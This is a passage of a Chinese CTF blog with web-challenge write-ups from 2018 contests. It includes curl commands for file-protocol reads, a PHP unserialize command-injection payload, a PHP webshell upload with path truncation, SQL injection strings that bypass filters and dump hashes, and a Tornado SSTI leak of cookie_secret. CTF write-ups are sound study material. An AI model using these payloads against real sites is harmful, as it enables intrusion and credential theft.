info:SELECT</span><br><span class="line">timestamp,user_name,uid,is_checked,message FROM feedbacks where uid=&#x27;1\\&#x27;or</span><br><span class="line">1#&#x27; ORDER BY id DESC &quot;&#125;</span><br></pre></td></tr></table></figure><p>用了addslashes,但是有一个接口是整形注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;result&quot;:&quot;&quot;,&quot;error&quot;:&quot;sql query error! debug info:SELECT</span><br><span class="line">timestamp,user_name,uid,is_checked FROM feedbacks where is_checked=1\\&#x27;</span><br><span class="line">ORDER BY id DESC limit 0,50&quot;&#125;</span><br></pre></td></tr></table></figure><p>直接跑就拿到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;result&quot;:[[&quot;1&quot;,&quot;bctf&#123;XsS_SQL1_7438x_2xfccmk&#125;&quot;,&quot;3&quot;,&quot;4&quot;]],&quot;error&quot;:&quot;&quot;&#125;</span><br></pre></td></tr></table></figure><p>自己做的时候发现的xss是登录界面的xss...没发现后台的token可以xss...登录处的触发需要撞验证码...所以post了几百个包..后来发现bot访问地超级慢第二天就被查水表2333... 不过思路没啥问题,csrf控制bot去触发xss载入js文件,当时想法是如果打到xss看下后台页面存不存在其他有用的东西,不过xss找错了,很可惜...不过反正也不会csrf...收了Nu1l师傅的csrfpayload了ORZ</p>]]></content>
      
      
      <categories>
          
          <category> web篇 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2018骇极杯webwp</title>
      <link href="/2018/11/05/2018%E9%AA%87%E6%9E%81%E6%9D%AFwebwp/"/>
      <url>/2018/11/05/2018%E9%AA%87%E6%9E%81%E6%9D%AFwebwp/</url>
      
        <content type="html"><![CDATA[<p>题目没什么感觉,从其他师傅那里还是能学到东西的</p><h2 id="web1">web1</h2><p>进去让看robots.txt,发现source.php和flag.php 去source.php看一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">you need to login as admin!&lt;!-- post param  &#x27;admin&#x27; --&gt;</span><br></pre></td></tr></table></figure><p>反正各种改头</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">blacsheep@Macbook:/home/blacsheep  $ curl -X POST --data <span class="string">&quot;admin=1&amp;url=http://www.ichunqiu.com&quot;</span> -H <span class="string">&quot;X-Client-Ip:127.0.0.1&quot;</span> <span class="string">&quot;http://e68314a9bc484ec0b24fb92e983038184bb2eb5bf0094b3c.game.ichunqiu.com/source.php&quot;</span></span><br><span class="line">you need to login as admin!&lt;!-- post param  <span class="string">&#x27;admin&#x27;</span> --&gt;http://www.ichunqiu.com&lt;img src=<span class="string">&quot;download/1776243742;img1.jpg&quot;</span>/&gt;% </span><br></pre></td></tr></table></figure><p>发现是个download的功能 那么去下载flag.php,用file协议</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">blacsheep@Macbook:/home/blacsheep  $ curl -X POST --data <span class="string">&quot;admin=1&amp;url=file://www.ichunqiu.com/var/www/html/flag.php&quot;</span> -H <span class="string">&quot;X-Client-Ip:127.0.0.1&quot;</span> <span class="string">&quot;http://e68314a9bc484ec0b24fb92e983038184bb2eb5bf0094b3c.game.ichunqiu.com/source.php&quot;</span> </span><br><span class="line">you need to login as admin!&lt;!-- post param  <span class="string">&#x27;admin&#x27;</span> --&gt;file://www.ichunqiu.com/var/www/html/flag.php&lt;img src=<span class="string">&quot;download/1574241457;img1.jpg&quot;</span>/&gt;%                  blacsheep@Macbook:/home/blacsheep  $ curl <span class="string">&quot;http://e68314a9bc484ec0b24fb92e983038184bb2eb5bf0094b3c.game.ichunqiu.com/download/1574241457;img1.jpg&quot;</span></span><br><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$flag</span>=<span class="string">&quot;flag&#123;b7e6122d-1c84-4785-a788-eeee18e17ac4&#125;&quot;</span>;</span><br></pre></td></tr></table></figure><h2 id="web2">web2</h2><p>扫目录,发现swp,恢复源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">come</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$method</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$args</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;method = <span class="variable">$method</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;args = <span class="variable">$args</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable language_">$this</span>-&gt;args <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;args[<span class="variable">$k</span>] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">waf</span>(<span class="title function_ invoke__">trim</span>(<span class="variable">$v</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$str</span>=<span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[&lt;&gt;*;?\n ]/&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line">        <span class="variable">$str</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$str</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">echo</span>(<span class="params"><span class="variable">$host</span></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;echo <span class="subst">$host</span>&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$this</span>-&gt;method, <span class="keyword">array</span>(<span class="string">&quot;echo&quot;</span>))) &#123;</span><br><span class="line">            <span class="title function_ invoke__">call_user_func_array</span>(<span class="keyword">array</span>(<span class="variable">$this</span>, <span class="variable">$this</span>-&gt;method), <span class="variable language_">$this</span>-&gt;args);</span><br><span class="line">                                                    &#125;</span><br><span class="line">                         &#125;</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$first</span>=<span class="string">&#x27;hi&#x27;</span>;</span><br><span class="line"><span class="variable">$var</span>=<span class="string">&#x27;var&#x27;</span>;</span><br><span class="line"><span class="variable">$bbb</span>=<span class="string">&#x27;bbb&#x27;</span>;</span><br><span class="line"><span class="variable">$ccc</span>=<span class="string">&#x27;ccc&#x27;</span>;</span><br><span class="line"><span class="variable">$i</span>=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$i</span>===<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$i</span>++;</span><br><span class="line">            <span class="variable">$$key</span> = <span class="variable">$value</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;<span class="keyword">break</span>;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$first</span>===<span class="string">&quot;doller&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    @<span class="title function_ invoke__">parse_str</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$var</span>===<span class="string">&quot;give&quot;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$bbb</span>===<span class="string">&quot;me&quot;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$ccc</span>===<span class="string">&quot;flag&quot;</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;welcome!&lt;br&gt;&quot;</span>;</span><br><span class="line">                <span class="variable">$come</span>=@<span class="variable">$_POST</span>[<span class="string">&#x27;come&#x27;</span>];</span><br><span class="line">                <span class="title function_ invoke__">unserialize</span>(<span class="variable">$come</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;think about it&lt;br&gt;&quot;</span>;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;NO&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Can you hack me?&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>简单测试下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@Macbook:/var/www/html  <span class="comment"># curl &quot;http://127.0.0.1?first=doller&amp;a=var%3dgive%26bbb%3dme%26ccc%3dflag&quot;</span></span><br></pre></td></tr></table></figure><p>拿到反序列化 然后用<code>$IFS</code>绕过空格</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$one</span> = <span class="keyword">new</span> <span class="title function_ invoke__">come</span>(<span class="string">&quot;echo&quot;</span>,<span class="keyword">array</span>(<span class="string">&#x27;`cat$IFS/flflagag`&#x27;</span>));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$one</span>)));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><a href="/images/2018/11/2018-11-05-11-14-32屏幕截图.png"><img src="/images/2018/11/2018-11-05-11-14-32屏幕截图.png" /></a></p><h2 id="web3">web3</h2><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">//error_reporting(0);</span></span><br><span class="line">    <span class="comment">//$dir=md5(&quot;icq&quot; . $_SERVER[&#x27;REMOTE_ADDR&#x27;]);</span></span><br><span class="line">    <span class="variable">$dir</span>=<span class="title function_ invoke__">md5</span>(<span class="string">&quot;icq&quot;</span>);</span><br><span class="line">    <span class="variable">$sandbox</span> = <span class="string">&#x27;/var/sandbox/&#x27;</span> . <span class="variable">$dir</span>;</span><br><span class="line">    @<span class="title function_ invoke__">mkdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line">    @<span class="title function_ invoke__">chdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>])&#123;</span><br><span class="line">        <span class="variable">$filename</span> = !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>]) ? <span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>] : <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">is_array</span>(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">            <span class="variable">$filename</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$filename</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$ext</span> = <span class="title function_ invoke__">end</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$ext</span>==<span class="variable">$filename</span>[<span class="title function_ invoke__">count</span>(<span class="variable">$filename</span>) - <span class="number">1</span>])&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;emmmm...&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$new_name</span> = (<span class="keyword">string</span>)<span class="title function_ invoke__">rand</span>(<span class="number">100</span>,<span class="number">999</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$ext</span>;</span><br><span class="line">        <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>],<span class="variable">$new_name</span>);</span><br><span class="line">        <span class="variable">$_</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;hehe&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(@<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">file</span>(<span class="variable">$_</span>)[<span class="number">0</span>],<span class="number">0</span>,<span class="number">6</span>)===<span class="string">&#x27;@&lt;?php&#x27;</span> &amp;&amp; <span class="title function_ invoke__">strpos</span>(<span class="variable">$_</span>,<span class="variable">$new_name</span>)===<span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="keyword">include</span>(<span class="variable">$_</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$new_name</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里有一个绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ext</span> = <span class="title function_ invoke__">end</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$ext</span>==<span class="variable">$filename</span>[<span class="title function_ invoke__">count</span>(<span class="variable">$filename</span>) - <span class="number">1</span>])&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;emmmm...&quot;</span>);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>比如</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="variable">$test</span>[<span class="number">1</span>]=<span class="number">456</span>;</span><br><span class="line"><span class="variable">$test</span>[<span class="number">0</span>]=<span class="number">123</span>;                                                     </span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$test</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">end</span>(<span class="variable">$test</span>));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$test</span>[<span class="title function_ invoke__">count</span>(<span class="variable">$test</span>)-<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">/var/www/html/second.php:5:</span></span><br><span class="line"><span class="comment">array (size=2)</span></span><br><span class="line"><span class="comment">  1 =&gt; int 456</span></span><br><span class="line"><span class="comment">  0 =&gt; int 123</span></span><br><span class="line"><span class="comment">/var/www/html/second.php:6:int 123</span></span><br><span class="line"><span class="comment">/var/www/html/second.php:7:int 456</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>这里后面可以路径截断一下,然后包含就可以了 这里还学到了unlink的一个绕过,参考:<a href="https://www.cnblogs.com/arongmh/p/8328470.html" title="https://www.cnblogs.com/arongmh/p/8328470.html">https://www.cnblogs.com/arongmh/p/8328470.html</a> 大概就是php读写文件的时候会用<code>php_stream_open_wrapper_ex</code>去打开,从而判断文件是否存在,而删除则不是,如果文件名里面有不存在的路径,那么就会导致删除失败. 综合payload</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>118ccb81ba1a41739d43b14979553ba5003a67d6e50945c0.game.ichunqiu.com</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>curl/7.61.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>518</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=------------------------99b94f48d2d866ad</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-pgsql"><span class="comment">--------------------------99b94f48d2d866ad</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;file&quot;; filename=&quot;index.php&quot;</span></span><br><span class="line"><span class="language-pgsql">Content-<span class="keyword">Type</span>: <span class="type">text</span>/html</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">@&lt;?php <span class="keyword">system</span>(<span class="string">&#x27;ls /&#x27;</span>); ?&gt;</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">--------------------------99b94f48d2d866ad</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;file[1]&quot;</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">def</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">--------------------------99b94f48d2d866ad</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;file[0]&quot;</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">php/../<span class="number">123.</span>php</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">--------------------------99b94f48d2d866ad</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;hehe&quot;</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">./<span class="number">123.</span>php</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">--------------------------99b94f48d2d866ad</span></span></span><br></pre></td></tr></table></figure><p>然后拿到flag <a href="/images/2018/11/2018-11-05-12-27-40屏幕截图.png"><img src="/images/2018/11/2018-11-05-12-27-40屏幕截图.png" /></a></p><h2 id="web4">web4</h2><p>简单点几下,发现查询用户和登录功能 查询用户简单测试,发现注入,加上提示</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$content</span>=<span class="title function_ invoke__">str_replace</span>(<span class="variable">$value</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$content</span>)</span><br></pre></td></tr></table></figure><p>去简单探测一下过滤的东西,发现from,select替换成了空,而information_schema和union是被ban了. 探测删除了啥可以用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;^&#x27;from&#x27;%23</span><br></pre></td></tr></table></figure><p>发现返回正常,那么'from'肯定是被换成了空了. 然后information_schema被过滤,这里绕过的方法很多</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.innodb绕过,但是无法查列名</span><br><span class="line">2.information . schema绕过(点左右加空格)</span><br><span class="line">3.informafromtion_schema(中间加替换字段)</span><br></pre></td></tr></table></figure><p>然后本来我是盲注的,这里可以将替换字段插入union来进行union注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=12&#x27;unifromon seleselectct 1,(selselectect group_concat(table_name) frfromom information_schefromma.tables where table_schema=database())%23</span><br></pre></td></tr></table></figure><p>拿到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">guest,user</span><br></pre></td></tr></table></figure><p>提取列</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id,username,password</span><br></pre></td></tr></table></figure><p>读密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">e3274be5c857fb42ab72d786e281b4b8</span><br></pre></td></tr></table></figure><p><a href="/images/2018/11/2018-11-05-12-41-32屏幕截图.png"><img src="/images/2018/11/2018-11-05-12-41-32屏幕截图.png" /></a> 解一下拿到密码:adminpassword 进去发现文件上传,随意传一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uploaded to ./1.png.txt</span><br><span class="line">please upload to ./flag.php</span><br></pre></td></tr></table></figure><p>利用路径绕过php,但是后面还有个<code>.txt</code> 这个地方卡了,看了wp才知道用的%02截断的... 这个字符是跑了一遍不可见字符跑出来的... <a href="/images/2018/11/2018-11-05-12-50-36屏幕截图.png"><img src="/images/2018/11/2018-11-05-12-50-36屏幕截图.png" /></a></p>]]></content>
      
      
      <categories>
          
          <category> web篇 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>互网杯webwp</title>
      <link href="/2018/10/18/%E4%BA%92%E7%BD%91%E6%9D%AFwebwp/"/>
      <url>/2018/10/18/%E4%BA%92%E7%BD%91%E6%9D%AFwebwp/</url>
      
        <content type="html"><![CDATA[<p>太多没打过的东西了,一道tornado,一道java的fastjson反序列化,一道go的溢出...还有一道很难但是出的很好的php... 参考:<a href="http://skysec.top/2018/10/13/2018%E6%8A%A4%E7%BD%91%E6%9D%AF-web-writeup/" title="http://skysec.top/2018/10/13/2018%E6%8A%A4%E7%BD%91%E6%9D%AF-web-writeup/">http://skysec.top/2018/10/13/2018%E6%8A%A4%E7%BD%91%E6%9D%AF-web-writeup/</a> <a href="https://xz.aliyun.com/t/2912" title="https://xz.aliyun.com/t/2912">https://xz.aliyun.com/t/2912</a></p><h2 id="easy-tornado">easy tornado</h2><p>进去发现三个链接,对应三个文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">http://49.4.78.81:30980/file?filename=Orz.txt&amp;signature=9e3bb6483951e58b6095f949d572dd9a</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Orz.txt </span><br><span class="line">render()</span><br><span class="line"></span><br><span class="line">http://49.4.78.81:30980/file?filename=hint.txt&amp;signature=74dfcb55b94ddbe4daedd3f21a68a2f1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">hint.txt </span><br><span class="line">md5(cookie_secret + md5(filename))</span><br><span class="line"></span><br><span class="line">http://49.4.78.81:30980/file?filename=flag.txt&amp;signature=6a86c265598a92ae8bff5c9f7b9f2a72</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag.txt </span><br><span class="line">/fllllllllllag</span><br></pre></td></tr></table></figure><p>访问文件需要签名,签名需要cookie_secret 尝试删掉签名,爆了error</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://49.4.78.81:30980/error?msg=xxx</span><br></pre></td></tr></table></figure><p>猜想ssti,试了一下7*7,发现过滤了* 简单fuzz一下,发现过滤了一堆字符,拿到shell是不大可能了,看能不能读到cookie_secret吧 后续测试一下,发现可以用handler和request.去看tornado源码<a href="https://github.com/tornadoweb/tornado/blob/master/tornado/auth.py" title="https://github.com/tornadoweb/tornado/blob/master/tornado/auth.py">https://github.com/tornadoweb/tornado/blob/master/tornado/auth.py</a> 尝试访问<code>&#123;&#123;handler.settings&#125;&#125;</code>,然后拿到cookie_secret 构造签名访问flag即可</p><h2 id="ltshop">ltshop</h2><p>go写的,算是学习了吧,go的int64存在溢出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.it1352.com/808569.html</span><br></pre></td></tr></table></figure><p>首先只有20块,条件竞争发包拿到5个以上辣条,然后flag需要99999999个大辣条,这肯定不够,猜想代码逻辑</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">if(da_la_tiao * 5 &lt;= user_latiao)</span><br><span class="line">&#123;</span><br><span class="line">    success</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    fail</span><br><span 